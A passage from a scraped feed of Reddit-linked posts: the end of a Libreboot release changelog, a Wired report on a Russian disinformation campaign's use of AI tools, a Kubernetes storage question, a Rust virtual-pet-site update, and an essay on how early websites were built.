rom.sh: Remove errant GRUB modules check \n* 4149f3dc81a submodule/grub: use codeberg for 1st gnulib mirror \n* 0305975e705 util/nvmutil: Update AUTHORS and COPYING files \n* 20b192e13bd util/nvmutil: Describe nvmutil in help output \n* d1ca21628cb util/nvmutil: Remove the correct binary on uninstall \n* e63fe256dfc util/spkmodem-recv: More correct Makefile \n* efd50ee548b util/nvmutil: Honour the INSTALL variable \n* 8008838abbc util/nvmutil: Don't clean when doing uninstall \n* 982f257f58a util/nvmutil: Proper DESTDIR/PREFIX handling \n* 3f85ae5f853 util/nvmutil: Set CC and CFLAGS only if unset \n* 2c7b9fb9412 util/nvmutil: Capitalise BABA \n* 57f9906f6d1 util/nvmutil: Add uninstall to Makefile \n* 4defe2c6085 util/nvmutil: Add distclean to Makefile \n* 033e4cd9d50 util/nvmutil: Make the GbE checksum a define \n* 874317c4e59 util/nvmutil: nicer hexdump display \n* a338e585eed util/nvmutil: show the correct hexdump order \n* b032e483ef1 lib.sh mktarball: cleaner if statement \n* 0cf58c22734 fix lbmk shellcheck errors \n* 8276560cc99 lib.sh and rom.sh: update my header \n* 08e86d2218c vendor.sh inject: reset err upon return \n* 41275d699ca vendor.sh: MUCH, MUCH, MUCH safer ./mk inject \n* ed7293494e3 util/nvmutil: Obey the 79-character per line limit \n* 637b5e36fd2 util/nvmutil: Tidy up copyright header \n* cd28db883e2 vendor.sh: fix comment \n* 57971ceb227 util/nvmutil: Fix another straggler \n* 15b37b2a1ab util/nvmutil: Tidy up pledge calls \n* e8799310db2 hp820g2: fix vendorfile inject and set release=y \n* f9ab082ec19 fedora41/dependencies: add libuuid-devel \n* 661591f9f0b add uuid-devel to fedora41 dependencies \n* 1a46c047386 support ./mk dependencies fedora reinstall \n* d58d63569f1 fix missing semicolon in grub nvme patch \n* 95ea3293df5 bump seabios to rev 1602647f1 (7 November 2024) \n* 6d7e6c361b3 Bump GRUB revision to 6811f6f09 (26 November 2024) \n* 09a01477df6 t480/3050micro: force power off post power failure \n* d344cd95eac flashprog: Disable -Werror \n* dc95e912bfe bump flashprog to revision eb2c041 (14 Nov 2024) \n* 27c8c1c16ba replace liblz4-tool with lz4 and liblz4-dev \n* d3a732a64db lib.sh dependencies: support --reinstall argument \n* 466ada423dd move xbmkpath to XBMK_CACHE/ \n* b0a23840327 Revert \"Remove legacy update/vendor commands\" \n* 3d7dd4aa9fe Fix U-Boot build issue with Swig 4.3.0 \n* 0c810747469 use command -v instead of which \n* 6c7e3ce2d6e trees: remove unnecessary subshell \n* ad137eae89d trees: only symlink host gcc/gnat to build xgcc \n* cfb6de94c33 trees: correction on check_gnu_path \n* ec2f0716662 trees: match gcc/gnat versions both ways \n* f64b5996279 Merge path.sh into script/trees \n* 295463d281e path.sh: Further cleanup \n* 5b24e0a5a96 path.sh: More thorough gcc/gnat version check \n* 7849a075886 path.sh: minor cleanup \n* 17168a87dbf path.sh: remove unnecessary shebang \n* e565df94fd7 Fix globbing issue in lbmk \n* c80cc0a00b6 remove auto-confirm on distro dependencies \n* 01fc65a0a9d Mitigate Debian Trixie/Sid GCC/GNAT version mismatch \n* 424b0c7103b t480/3050micro: disable hyperthreading \n* 603105f3b4e t480/t480s: Disable TPM2 to mitigate SeaBIOS lag \n* 754bd1e6ca3 rom.sh: Name pico directory serprog_pico \n* db22308eba5 add 2024 to Riku's copyright header on rom.sh \n*   4fa5f696db8 Merge pull request 'rp2530' (#258) from Riku_V/lbmk:rp2530 into master \n|\\  \n| * a5e0360992d pico-sdk: update to 2.1.0 \n| * e2f8cc7f3ee pico-serprog: enable building for multiple pico chips \n|/  \n* ccc2b4d589f add spdx headers to dependencies configs \n* a3969701e6b dependencies/debian: fix debian sid \n* 8f370cb60d9 add spdx headers to various config files \n* d591ea4c5dc git.sh: don't initialise livepull globally \n* b5da9feba3b vendor.sh: Print useful message on ./mk inject \n* 12c6259cb2f vendor.sh: Handle FSP insertion post-release \n* 78132051462 Remove legacy update/vendor commands \n* 07037561bd6 lbmk: remove use of deprecated ./vendor command \n* 5d1f1823067 vendor.sh: Safer exit when vendorfiles not needed \n* a18175a5df9 data/deguard: Remove unused patch \n* ee8f53b96ff lib.sh: Safer exit from ./mk dependencies \n* a8b35c88cf1 remove geteltorito and mtools from lbmk \n* 1dd32ea5487 rom.sh: support grub-first setups \n* f7801ef4770 vendor.sh: delete old tb.bin first, just in case \n* 02cbf8a729d vendor.sh: make TBFW pad size configurable \n* 9884e5ed1b0 T480/T480S: Support fetching ThunderBolt firmware \n* 36b42dd1c11 also de-rainbow the u-boot menu \n* eafc82028a4 Revert \"use rainbow deer on the grub background\" \n* 44969c73bd2 rom.sh: insert grub background in cbfs not memdisk \n* 401efb24b22 use rainbow deer on the grub background \n* dc27cb91784 add some scripts to .gitignore \n* 3b6b283eabe disable 3050micro nvme hotplug \n* c2023921893 fix t480 spd size (512, not 256) \n* da527459b68 add tarballs and signatures to gitignore \n* b910424b5df fix another very stupid mistake \n* e3b77b132e6 fix the stupidest bug ever </code></pre><p>This is about 650 changes.</p><p>When certain bugs are found, releases may be re-built and re-uploaded. When this happens, the original release is replaced with a .</p><p>Revisions are numbered; for example, the first post-release revision is .</p><p>No revisions, thus far. The original 25.06 release is the current revision, so it could be considered  (revision zero).</p><p>This release was built on the latest Debian 12.10 Bookworm release, as of this day. It was also build-tested successfully on the latest Arch Linux updates as of 26 June 2025.</p>","contentLength":76080,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1lpbbwj/libreboot_2506_released/"},{"title":"A Pro-Russia Disinformation Campaign Is Using Free AI Tools to Fuel a ‘Content Explosion’","url":"https://www.wired.com/story/pro-russia-disinformation-campaign-free-ai-tools/","date":1751398321,"author":"/u/wiredmagazine","guid":179309,"unread":true,"content":"<p> campaign is leveraging consumer artificial intelligence tools to fuel a “content explosion” focused on exacerbating existing tensions around global elections, Ukraine, and immigration, among other controversial issues, according to <a data-offer-url=\"https://checkfirst.network/wp-content/uploads/2025/06/Overload%C2%A02_%20Main%20Draft%20Report_compressed.pdf\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://checkfirst.network/wp-content/uploads/2025/06/Overload%C2%A02_%20Main%20Draft%20Report_compressed.pdf&quot;}\" href=\"https://checkfirst.network/wp-content/uploads/2025/06/Overload%C2%A02_%20Main%20Draft%20Report_compressed.pdf\" rel=\"nofollow noopener\" target=\"_blank\">new research published last week</a>.</p><p>The campaign, known by many names including <a data-offer-url=\"https://www.recordedfuture.com/research/operation-overload-impersonates-media-influence-2024-us-election\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.recordedfuture.com/research/operation-overload-impersonates-media-influence-2024-us-election&quot;}\" href=\"https://www.recordedfuture.com/research/operation-overload-impersonates-media-influence-2024-us-election\" rel=\"nofollow noopener\" target=\"_blank\">Operation Overload</a> and <a href=\"https://www.wired.com/story/kremlin-backed-accounts-trying-to-destroy-yulia-navalnaya/\">Matryoshka</a> (other researchers have also tied it to <a data-offer-url=\"https://blogs.microsoft.com/on-the-issues/2024/06/02/russia-cyber-bots-disinformation-2024-paris-olympics/\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://blogs.microsoft.com/on-the-issues/2024/06/02/russia-cyber-bots-disinformation-2024-paris-olympics/&quot;}\" href=\"https://blogs.microsoft.com/on-the-issues/2024/06/02/russia-cyber-bots-disinformation-2024-paris-olympics/\" rel=\"nofollow noopener\" target=\"_blank\">Storm-1679</a>), has been operating since 2023 and has been aligned with the Russian government by multiple groups, including <a data-offer-url=\"https://blogs.microsoft.com/on-the-issues/2024/06/02/russia-cyber-bots-disinformation-2024-paris-olympics/\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://blogs.microsoft.com/on-the-issues/2024/06/02/russia-cyber-bots-disinformation-2024-paris-olympics/&quot;}\" href=\"https://blogs.microsoft.com/on-the-issues/2024/06/02/russia-cyber-bots-disinformation-2024-paris-olympics/\" rel=\"nofollow noopener\" target=\"_blank\">Microsoft</a> and the <a data-offer-url=\"https://www.isdglobal.org/digital_dispatches/stolen-voices-russia-aligned-operation-manipulates-audio-and-images-to-impersonate-experts/\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.isdglobal.org/digital_dispatches/stolen-voices-russia-aligned-operation-manipulates-audio-and-images-to-impersonate-experts/&quot;}\" href=\"https://www.isdglobal.org/digital_dispatches/stolen-voices-russia-aligned-operation-manipulates-audio-and-images-to-impersonate-experts/\" rel=\"nofollow noopener\" target=\"_blank\">Institute for Strategic Dialogue</a>. The campaign disseminates false narratives by impersonating media outlets with the apparent aim of sowing division in democratic countries. While the campaign targets audiences around the world, <a data-offer-url=\"https://www.recordedfuture.com/research/operation-overload-impersonates-media-influence-2024-us-election\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.recordedfuture.com/research/operation-overload-impersonates-media-influence-2024-us-election&quot;}\" href=\"https://www.recordedfuture.com/research/operation-overload-impersonates-media-influence-2024-us-election\" rel=\"nofollow noopener\" target=\"_blank\">including in the US</a>, its main target has been Ukraine. Hundreds of AI-manipulated videos from the campaign have tried to fuel pro-Russian narratives.</p><p>The report outlines how, between September 2024 and May 2025, the amount of content being produced by those running the campaign has increased dramatically and is receiving millions of views around the world.</p><p>In their report, the researchers identified 230 unique pieces of content promoted by the campaign between July 2023 and June 2024, including pictures, videos, QR codes, and fake websites. Over the last eight months, however, Operation Overload churned out a total of 587 unique pieces of content, with the majority of them being created with the help of AI tools, researchers said.</p><p>The researchers said the spike in content was driven by consumer-grade AI tools that are available for free online. This easy access helped fuel the campaign’s tactic of “content amalgamation,” where those running the operation were able to produce multiple pieces of content pushing the same story thanks to AI tools.</p><p>“This marks a shift toward more scalable, multilingual, and increasingly sophisticated propaganda tactics,” researchers from Reset Tech, a London-based nonprofit that tracks disinformation campaigns, and Check First, a Finnish software company, wrote in the report. “The campaign has substantially amped up the production of new content in the past eight months, signalling a shift toward faster, more scalable content creation methods.”</p><p>Researchers were also stunned by the variety of tools and types of content the campaign was pursuing. \"What came as a surprise to me was the diversity of the content, the different types of content that they started using,” Aleksandra Atanasova, lead open-source intelligence researcher at Reset Tech, tells WIRED. “It's like they have diversified their palette to catch as many like different angles of those stories. They're layering up different types of content, one after another.”</p><p>Atanasova added that the campaign did not appear to be using any custom AI tools to achieve their goals, but were using AI-powered voice and image generators that are accessible to everyone.</p><p>While it was difficult to identify all the tools the campaign operatives were using, the researchers were able to narrow down to one tool in particular: Flux AI.</p><p>Flux AI is a text-to-image generator developed by Black Forest Labs, a German-based company founded by former employees of Stability AI. Using the SightEngine image analysis tool, the researchers found a 99 percent likelihood that a number of the fake images shared by the Overload campaign—some of which claimed to show Muslim migrants rioting and setting fires in Berlin and Paris—were created using image generation from Flux AI.</p>","contentLength":3543,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1lpb1z5/a_prorussia_disinformation_campaign_is_using_free/"},{"title":"How to safely change StorageClass reclaimPolicy from Delete to Retain without losing existing PVC data?","url":"https://www.reddit.com/r/kubernetes/comments/1lpavii/how_to_safely_change_storageclass_reclaimpolicy/","date":1751397896,"author":"/u/kiroxops","guid":179361,"unread":true,"content":"<p>Hi everyone, I have a StorageClass in my Kubernetes cluster that uses reclaimPolicy: Delete by default. I’d like to change it to Retain to avoid losing persistent volume data when PVCs are deleted.</p><p>However, I want to make sure I don’t lose any existing data in the PVCs that are already using this StorageClass.</p>","contentLength":314,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"A virtual pet site written in Rust, inspired by Neopets - 2 years later!","url":"https://www.reddit.com/r/rust/comments/1lp9f6g/a_virtual_pet_site_written_in_rust_inspired_by/","date":1751394570,"author":"/u/lemphi","guid":180375,"unread":true,"content":"<p>Just about two years ago <a href=\"https://old.reddit.com/r/rust/comments/15c0j97/a_virtual_pet_site_written_in_rust_inspired_by/\">I posted here</a> about how I was looking to get better with Rust and remembered how much I liked Neopets as a kid, so I ended up making a virtual pet site in Rust as a fun little project! Well, I've still been working on it daily ever since then, and it's not quite so little anymore, so I thought I'd provide an update here in case anyone was curious about how everything's going.</p><p>It uses Rust on the backend and TypeScript on the frontend. The only frontend dependencies are TypeScript, Solid JS, and mutative. The backend server runs on a $5 / month monolithic server and mostly uses axum, sqlx, Postgres, strum, tokio, tungstenite, rand, and oauth2.</p><p>I've also really optimized the code since then. Previously, user requests would use JSON, but I've since migrated to binary websockets. So now most requests and responses are only a few bytes each (variable length binary encoding).</p><p>I also wrote some derive macro crates that convert Rust data types to TypeScript. So I can annotate my Rust structs / enums and it generates interface definitions in TypeScript land for them, along with functions to decode the binary into the generated interface types. So Rust is my single source of truth (as opposed to having proto files or something). Some simple encoding / decoding crates then serialize my Rust data structures into compact binary (so much faster and smaller than JSON). Most of the data sent (like item IDs, quantities, etc.) are all small positive integers, and with this encoding protocol each is only 1 byte (variable length encoding).</p><p>So now I can write something like this:</p><pre><code>#[derive(BinPack, FromRow, ToTS, DecodeTS)] pub struct ResponseProfile { pub person_id: PersonID, pub handle: String, pub created_at: UnixTimestamp, pub fishing_casts: i32 } </code></pre><p>and the following TypeScript is automatically generated:</p><pre><code>export interface ResponseProfile { person_id: PersonID; handle: string; created_at: UnixTimestamp; fishing_casts: number; } export function decodeResponseProfile(dv: MyDecoder): ResponseProfile { return { person_id: decodePersonID(dv), handle: dv.getStr(), created_at: decodeUnixTimestamp(dv), fishing_casts: dv.getInt(), }; } </code></pre><p>Another design change was that previously I used a lot of  for many things in the web server (like everyone's current luck, activity feed, rate limiters, etc.) I never liked this and after a lot of thinking I finally switched towards an approach where each player is a separate actor, and channels are used to send messages to them, and they own their own state in their own tokio task. So each player actor now owns their activity feed, game states, current luck, arena battle state, etc. This has led to a much cleaner (and much more performant!) architecture and I was able to delete a ton of mutexes / rwlocks, and new features are much easier to add now.</p><p>With these changes, I was able to be much more productive and added a ton of new locations, activities, items, etc. I added new puzzles, games, dark mode, etc. And during all of this time, the Rust server has still never crashed in the entire 3 years it's been running (compared to my old Node JS days this provides me  much peace of mind). The entire codebase (frontend + backend) has grown to be around 130,000 lines of code, but the code is still so simple and adding new features is still really trivial. And whenever I refactor anything, the Rust compiler tells me everything I need to change. It's so nice because I never have to worry about breaking anything because the compiler always tells me anything I need to update. If I had to do everything over again I would still choose Rust 100% because it's been nothing but a pleasure.</p><p>But yeah, everything is still going great and it's so much fun coming up with new stuff to add all the time. Here's some screenshots and a trailer I made recently if you want to see what it looks like (also, almost every asset is an SVG since I wanted all the characters and locations to look beautiful at every browser zoom level). Also, I'd love to hear any feedback, critique, thoughts, or ideas if you have any!</p>","contentLength":4076,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Websites used to be simple","url":"https://simplesite.ayra.ch/","date":1751392243,"author":"/u/AyrA_ch","guid":179227,"unread":true,"content":"<p><i>\n\t\t\t\tThis website is a trip down memory lane.\n\t\t\t\tI'm not trying to tell you to stop modern web development.\n\t\t\t\tThis website uses technologies not available at the time the content here is about.\n\t\t\t\tIt works on mobile (tested in Firefox for Android) but you miss out on the background image.\n\t\t\t</i></p><p>\n\t\t\tI created my first website somewhere in the early 2000s,\n\t\t\tand like most websites back then, it was very simple.\n\t\t\tNot surprising, considering most people (including me) were likely using notepad to create those websites,\n\t\t\twhich puts a limit on their complexity.\n\t\t\tIt was either that or  editors that would chain you to themselves\n\t\t\tbecause there was no chance the generated HTML would be maintainable at all without the tool,\n\t\t\tand if you did manual edits it could outright break your editor.\n\t\t\tThere were no iPhones, there was barely any SEO, and JavaScript really was optional, and so was CSS.<p>\n\t\t\tThe color representation on early LCD screens was bad, so you better picked a color scheme with high contrast.\n\t\t</p></p><p>\n\t\t\tThe resolution of choice was 1024×768 (or 1280×1024 if you could afford it),\n\t\t\tand yet with the window frame and the toolbars we had back then your website should better also work on 800×600.\n\t\t\tYou didn't want to have content right up to the edge of the left or right screen border anyways.\n\t\t</p><div>\n\t\t\tFor reference, this image shows the resolutions 1920×1080 (HD), 1280×1024, 1024×768,\n\t\t\tand 800×600 in relation to each other.<img src=\"https://simplesite.ayra.ch/?file=VGA\" alt=\"Various colored rectangles stacked on top of each other comparing display resolutions\"></div><p>\n\t\t\tThe simplest sites were just plain HTML without anything beyond the basic formatting.\n\t\t\tSometimes a  and  if we felt fancy.\n\t\t\tPeople that cared would change the font to a sans-serif type,\n\t\t\toften using a  tag that went around the entire page.\n\t\t\tThere weren't a lot of safe fonts out there, and your choices were as follows:\n\t\t</p><ul><li>:\n\t\t\t\tSerif fonts being the default made this look like a mistake or low effort,\n\t\t\t\tbut in the right places could add some nostalgia.\n\t\t\t\tAnd it does look professional, considering it's the \"newspaper font\".\n\t\t\t\tBeing the default, it is also what you got if the font of choice\n\t\t\t\tby the website owner was not installed on your system.\n\t\t\t</li><li>:\n\t\t\t\tThe font of choice for when you don't know what else to pick.\n\t\t\t\tA sensible option, suitable for pretty much all applications.\n\t\t\t</li><li>:\n\t\t\t\tNerds. Nerds picked this font.\n\t\t\t\tThe choice for when text had to be green on black background.\n\t\t\t</li><li>:\n\t\t\t\tNow likely the most hated font, back then a good choice for your personal website.\n\t\t\t\tIt may look goofy but its readability is not to be underestimated.\n\t\t\t\tIt's a windows-only font, but most people were using Windows back then.\n\t\t\t</li></ul><p>\n\t\t\tAnimated gif images were always an option, but they eat up valuable bandwidth.\n\t\t\tFor simple move or blink animations,\n\t\t\tthe  and  tags had you covered.\n\t\t\tThe marquee is deprecated but still works. Blink was removed\n\t\t\tbut a bit of JS .\n\t\t\tIn that regards, <a href=\"https://simplesite.ayra.ch/anim.php\">please enjoy the most important animation ever in pure HTML</a>.\n\t\t</p><p>\n\t\t\tIn absence of most CSS features we now take for granted,\n\t\t\ttiny images were common to achieve things like color gradient, rounded border edges\n\t\t\tand fancy looking buttons. It wasn't uncommon for a site to be made up of 10 or more images for this purpose.\n\t\t</p><p>\n\t\t\tWe also occasionally added background images.\n\t\t\tThese were usually very small and would tile across the page.\n\t\t\tYou could steal them from an existing website, or make one yourself.\n\t\t\tIn fact, I proudly present the literal \"wall\" paper on this page, created in mspaint in two minutes.\n\t\t\tIt's around 130 bytes. Not as fancy as an animated image but better than a solid color.\n\t\t\tIf the wallpaper made text unreadable we would either go into mspaint and floodfill it with a different color,\n\t\t\tor just increase the font size.\n\t\t\tWe weren't in a rush, and didn't need to cram as much information as possible into the viewport either.\n\t\t</p><p>\n\t\t\tThe fancy people would make the background image stay put when scrolling the content, just like on this page.\n\t\t</p><h2>Partitioning your website</h2><p>\n\t\t\tModern websites have it easy.\n\t\t\tIf you want your header or a menu to stay visible you can just use \n\t\t\tand voilà, your element will stay inside of the viewing area when scrolling.\n\t\t</p><p>\n\t\t\tWe didn't had this luxury, but what we had were framesets.\n\t\t\tA frameset was (actually still is) a way of partitioning the browser window,\n\t\t\tand displaying individual pages inside of those partitions.\n\t\t\tMany websites would have the following layout:\n\t\t</p><p>\n\t\t\tUnless blocked with an attribute,\n\t\t\tusers could drag the frame border around to change the partition ratio.\n\t\t\tThe border could also be made invisible, creating a seamless experience.\n\t\t\tIf the background color of each frame was the same you could usually not tell that frames were there,\n\t\t\tunless you were looking closely during the page load.\n\t\t</p><p>\n\t\t\tThe frames could interact with each other.\n\t\t\tYou could give them an identifier using the  attribute,\n\t\t\tand links could change the URL of a given frame using the  attribute.\n\t\t\tMy first background music changer worked this way.\n\t\t\tA frame could contain a website, or another frameset, allowing to partition the window multiple times.\n\t\t</p><p>\n\t\t\tYes this technology still works. It is marked as deprecated but\n\t\t\tit will still render and behave like it did over 20 years ago.\n\t\t</p><p>\n\t\t\tTables were pretty much the only universal means of creating a responsive web layout.\n\t\t\tIf you fixed the width of all but one column the unfixed column would adjust in width automatically\n\t\t\tto the current window size if the table width was set to 100%.\n\t\t</p><p>\n\t\t\tTables were also the first universal way of vertically centering content\n\t\t\tusing the  attribute.\n\t\t\tThe frameset layout shown above would occasionally be made with tables\n\t\t\trather than frames. People would shove entire websites into single table cells.\n\t\t</p><p>\n\t\t\tResponsive meant it would adjust to the screen size of a computer.\n\t\t\tNobody cared about the modern doomscrolling rectangles because they didn't exist yet.\n\t\t\tWe did not have flexbox, but <a href=\"https://simplesite.ayra.ch/noflex.php\">float:left</a> gets you quite far.\n\t\t</p><p>\n\t\t\tThe early solution to mobile devices was a completely separate website,\n\t\t\toptimized for small screens. People would be redirected based on the user agent string.\n\t\t</p><p>\n\t\t\tJavaScript is a language designed to be just barely good enough to make animated gif images\n\t\t\tdance around on the page and for the content around your mouse cursor to sparkle\n\t\t\twhen you move it.\n\t\t\tAnd this is exactly how we used it. This and drop down menus.\n\t\t\tAnything beyond that would get you into the realm of browser compatibility problems.\n\t\t\tThose problems are what made jQuery popular because it detected your browser\n\t\t\tand abstracted all the differences it had with other browsers away,\n\t\t\tbut for a very long time, conditional HTML comments were the norm to make IE behave.\n\t\t\tPractically every page had a <code>&lt;!--[if IE lt 7]&gt;...&lt;![endif]--&gt;</code> section.\n\t\t\tFor most small scripts, you would go to a site like  (defunct),\n\t\t\tsearch for the script you wanted, and copy paste it into your website.\n\t\t\tThis behavior hasn't significantly changed although now you go to stackoverflow or ask an AI.\n\t\t\tBack then copy pasting scripts was your best bet\n\t\t\tbecause JS debugging tools were virtually non-existent at that time.\n\t\t\tScript loading would (and still does) block the page from rendering anything below it,\n\t\t\tso script tags were traditionally put at the bottom of the page rather than the header,\n\t\t\tand small scripts were inlined.\n\t\t\tToday we have the  attribute.\n\t\t</p><p>\n\t\t\tA script at the bottom of course meant users with slow connections\n\t\t\tcould try to interact with your page before it fully loaded in.\n\t\t\tThis was often solved by making the main page element hidden initially\n\t\t\tand displaying a \"Loading\" text (or gif if you were fancy) instead.\n\t\t\tA small script that was jammed into the  attribute of the body\n\t\t\twould then hide the loading banner and show the main content.\n\t\t</p><p>\n\t\t\tIf you ever need to make a page interactable before it is fully loaded,\n\t\t\tuse a mutation observer on the document root element that monitors added nodes.\n\t\t\tThen simply add the events to the relevant elements as they're streamed in.\n\t\t\tWe didn't had that back then. Instead we would register a setInterval function\n\t\t\tthat frequently added events, and unregistered said function in the onload event.\n\t\t</p><p>\n\t\t\tRegardless of the amount of scripts on a page,\n\t\t\tserious websites would work to some extent without it,\n\t\t\tsimply because JS was a security problem, and so was disabled in many corporate environments.\n\t\t\tThe  tag can be used to render any content (including  tags)\n\t\t\tif scripts are disabled. This is usually used to inform the user that JS is necessary,\n\t\t\tor to provide a link to a less interactive version of the site.\n\t\t\tHowever JS is now considered a base requirement for most websites.\n\t\t\tSites that use JS based UI rendering will just remain blank if JS is disabled.\n\t\t</p><h2>Dynamic Server Side Content</h2><p>\n\t\t\tA super fancy page would show dynamic content from the server and update it.\n\t\t\tThe simplest solution that worked in all browsers was an iframe with a meta refresh tag inside.\n\t\t\tIt would unconditionally reload the iframe. By making the border invisible people wouldn't even be able to tell.\n\t\t\tThis of course is kinda bad because you reload the page regardless of whether there is new content to show or not.\n\t\t</p><p>\n\t\t\tLong polling must be among the dirtiest, nastiest tricks we used to get content to dynamically update from the server.\n\t\t\tWhen you load a website, your browser actually renders the HTML elements as they're streamed from the network.\n\t\t\tThis is why on some slow sites the width of various elements changes as the site loads.\n\t\t\tHTTP was strictly a client to server initiated protocol.\n\t\t\tWe figured out however that you can abuse the HTML streaming behavior\n\t\t\tto implement a server to client initiated protocol.<p>\n\t\t\tYou would do this by loading a page in an iframe that was purposefully designed to never stop loading.\n\t\t\tIt would occasionally send an invisible HTML comment to keep the connection open,\n\t\t\tbut would otherwise remain silent until it was necessary to push new content to the client.\n\t\t\tYou would then simply send a </p> tag with new JavaScript instructions inside,\n\t\t\tor if the content was purely for display purposes,\n\t\t\ta  with the content inside, plus a piece of CSS code to hide the previous div.\n\t\t\tWebsites would grow indefinitely with this but you could simply solve this with a meta refresh\n\t\t\tthat triggered when the connection ended.<p>\n\t\t\tIt was crude but it was dynamic content without JS.\n\t\t\tWe built entire live chat systems around this.\n\t\t</p></p><p>\n\t\t\tThe first true way to replace long polling are websockets.\n\t\t\tHTTP 2 and 3 have the ability to push events to the client without waiting for a client request\n\t\t\tin what is known as \"server push\" but I've never seen it in the wild.\n\t\t</p><p>\n\t\t\tAjax stands for \"Asynchronous javascript and XML\".\n\t\t\tIt was invented by Microsoft to streamline communication between web browsers (only Internet Explorer actually)\n\t\t\tand the Exchange Server web interface. The technology is actually quite old.\n\t\t\tInternet Explorer 5 was the first browser to ship with this, but others were quickly to adopt it too.\n\t\t\tMicrosoft products intensively use XML, which is why XML is contained in \"Ajax\",\n\t\t\twhy the JS object to make requests is named ,\n\t\t\tand why there's a dedicated  property in it.\n\t\t</p><p>\n\t\t\tAnything not covered by web standards could be extended using ActiveX.\n\t\t\tThis was basically a way to load and call functions from native DLLs that registered themselves as an ActiveX component.\n\t\t\tThis was necessary to play video. It was also needed for audio if you desired any control over the playback whatsoever\n\t\t\tbecause  would not allow you to control playback\n\t\t\tbeyond replacing its value with \"about:blank\" using JS to stop it entirely.\n\t\t\tNow deprecated,  was replaced with .\n\t\t\tAnd thankfully, fully automated audio playback on page load is not permitted by modern browsers\n\t\t\tbecause that is certainly something I don't want back.\n\t\t</p><p>\n\t\t\tBack then, ActiveX was also a way to bypass some system restrictions.\n\t\t\tAt school they would block the remote desktop client, but that block was only for the executable.\n\t\t\tI would just load the MSTSCAX library into a html file and then use the web browser to connect to my home computer\n\t\t\twhenever I found a website being blocked.\n\t\t</p><p>\n\t\t\tThe entire system was a nightmare but Microsoft could basically do whatever they desired\n\t\t\tbecause of the massive market share that Internet Explorer had.\n\t\t\tEvery browser implemented this differently, and you had to update these components all the time.\n\t\t</p><p>\n\t\t\tFlash (see: \"Vulnerability as a Service\") allowed you to do many things that initially weren't possible without,\n\t\t\tincluding but not limited to video and audio playback without depending on locally installed codecs,\n\t\t\tlive streaming, file uploads with a progress bar, and networked multiplayer games.\n\t\t\tAt some point it was basically mandatory to have it installed\n\t\t\tbecause most websites would to some extent depend on it.\n\t\t</p><p>\n\t\t\tBandwidth was obviously at a premium.\n\t\t\tAnd while times were slower back then,\n\t\t\twe would not want to wait for ages either.\n\t\t\tDSL was just getting popular,\n\t\t\tand I was lucky enough to start out with a 5000/500 kbps connection.\n\t\t\tA good website however would load in an acceptable manner on a dialup connection.\n\t\t\tThese were commonly known as \"56k\" because that was their speed under ideal conditions,\n\t\t\t56 kilobits per second. This amounts to 7 kilobytes per second.<p>\n\t\t\tYou often would get a bit more because the connection supported compression,\n\t\t\tand HTML is fairly simple to compress.\n\t\t</p></p><p>\n\t\t\tImages were considered high Bandwidth media back then, and you would not fill your page with them\n\t\t\twithout some serious modifications.\n\t\t\tThe image further below is a new version of the Windows XP default wallpaper known as \"bliss\"\n\t\t\tthat Microsoft recently released. The colors in their version are more muted than the original,\n\t\t\tbut I found this \"corrected\" version that's more in spirit with the original.\n\t\t\tThe image is 2'345'199 bytes in size.\n\t\t\tThis would load 5.5 minutes given a 56k connection.</p><p>\n\t\t\tTo improve load speeds we first drop the resolution.\n\t\t\tIf our site should work with 800×600 displays\n\t\t\tthere is no need to have this image in its original 4089×2726 size,\n\t\t\tand because we likely don't have the full size of the screen available due to the frameset menu,\n\t\t\twe can scale it down to fit 640×480 (the OG VGA resolution).\n\t\t</p><p>\n\t\t\tNext is the quality. By setting the jpeg to 75% quality we can further reduce the size.\n\t\t\tThis quality value is good for noisy pictures like this but will show artifacts around hard borders,\n\t\t\tof which there are none.\n\t\t\tWith those limits the image will load in about 6 seconds.\n\t\t</p><p>\n\t\t\tWe can simulate a faster image load by saving it as a progressive image.\n\t\t\tProgressive images don't store the pixels in the normal order, but rather store them in groups.<i>(This is a simplification)</i>\n\t\t\tThe first group will only store every 8th pixel horizontally and vertically.\n\t\t\tThe next group will store every 4th pixel (minus those already contained in the first group),\n\t\t\tand so on until all pixels are represented.\n\t\t\tDepending on how good your eyes are you may not even notice the last pass.\n\t\t\tImages stored this way will slightly increase in size,\n\t\t\tbut rather than having to wait for it to slowly appear line by line,\n\t\t\twe can fairly quickly render an initial (blurry) version that progressively (hence the name) gets better.<p>\n\t\t\tThis is also possible with PNG images.\n\t\t</p></p><p>\n\t\t\tThe image below has been saved with all the given constraints and settings mentioned above.\n\t\t\tIt is now about 35 KB. To see it load progressively,\n\t\t\trefresh the page or open the image in a new tab.\n\t\t</p><img src=\"https://simplesite.ayra.ch/?file=bliss\" ismap=\"\" alt=\"Windows XP default wallpaper\"><p>\n\t\t\tIf you did not want to compromise on the quality you would\n\t\t\tcreate a thumbnail that when clicked, would navigate the user to the raw image.\n\t\t</p><p>\n\t\t\tHere's the PHP code that converted this image\n\t\t</p><pre>$bliss = ImageCreateFromJpeg('bliss.jpg');\n// \"-1\" means to calculate height to keep aspect ratio\n$scaled = ImageScale($bliss, 640, -1, IMG_BICUBIC);\nImageDestroy($bliss);\n// Enable progressive scan\nImageInterlace($scaled, TRUE);\n// Save with 75% quality\nImageJpeg($scaled, 'bliss_scaled.jpg', 75);\nImageDestroy($scaled);</pre><p>\n\t\t\tIf the client had JavaScript enabled,\n\t\t\tyou could load the image using JS only when the user scrolls the image into view.\n\t\t\tThis could save substantial bandwidth on image heavy sites.\n\t\t\tYou can still do this, but the browser does it automatically if you add the  attribute.\n\t\t\tThis also stops the image from blocking the page load event.\n\t\t</p><p>\n\t\t\tImages could be made interactive to some 